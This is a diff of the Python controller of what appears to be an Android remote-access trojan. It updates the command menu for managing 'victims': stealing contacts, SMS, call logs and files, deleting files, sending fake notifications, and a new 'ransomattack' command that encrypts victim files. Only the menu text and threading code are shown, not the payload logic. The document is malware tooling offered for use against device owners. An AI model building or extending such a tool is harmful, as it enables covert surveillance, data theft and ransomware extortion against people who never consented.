@@ -45,11 +45,15 @@ def help():
     commands results
     
     ls       list of all victims
-    set      set target ex : set 1234        (1234 = target userid)
     getcon   get all contacts from user android device
     getsms   get all sms from user android device
     getcalllogs  get all call history
     getfileloc   get all files path
+	getfile      Downlaod any file from victim device
+	sendnoti     send fake notification to victim
+	delelet      delelet any file from victim device
+	chngwal      change victim wallpaper
+	ransomattack encrypt victim files
     """)
 
 def getcon():
@@ -199,4 +203,6 @@ def start():
 
 t = threading.Thread(target=start(), name='start')
 t.start()
+
+
 
